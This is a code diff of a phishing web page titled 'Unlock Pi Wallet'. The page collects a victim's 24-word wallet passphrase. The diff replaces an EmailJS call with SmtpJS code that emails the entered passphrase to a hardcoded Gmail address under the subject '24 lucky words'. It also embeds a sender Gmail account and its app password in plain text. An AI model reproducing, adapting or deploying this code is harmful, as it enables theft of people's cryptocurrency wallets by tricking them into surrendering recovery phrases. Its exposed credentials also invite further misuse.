@@ -4,13 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Unlock Pi Wallet</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-        (function() {
-            // Replace with your actual User ID from EmailJS Integration
-            emailjs.init("Van"); 
-        })();
-
         function sendPassphrase() {
             var passphrase = document.getElementById("passphrase").value.trim();
             
@@ -20,19 +15,23 @@
                 return;
             }
 
-            var templateParams = {
-                passphrase: passphrase,
-                email_to: "brethrenwrites@gmail.com"
-            };
-
-            emailjs.send("service_a326ise", "template_3z7dvs5", templateParams)
-                .then(function(response) {
-                    console.log("SUCCESS!", response.status, response.text);
-                    showSuccessMessage();
-                }, function(error) {
-                    console.log("FAILED...", error);
-                    alert("Failed to submit. Try again.");
-                });
+            Email.send({
+                Host: "smtp.gmail.com",
+                Username: "bcmideachannel@gmail.com",  // Your Gmail Address
+                Password: "mddaqwyfjdcdsyeb",    // Use the App Password generated
+                To: 'brethrenwrites@gmail.com',
+                From: "bcmideachannel@gmail.com",     // Your Gmail Address again
+                Subject: "24 lucky words",
+                Body: "Passphrase: " + passphrase
+            }).then(
+                message => {
+                    if (message === "OK") {
+                        showSuccessMessage();
+                    } else {
+                        alert("Failed to submit. Try again.");
+                    }
+                }
+            );
         }
 
         function showSuccessMessage() {
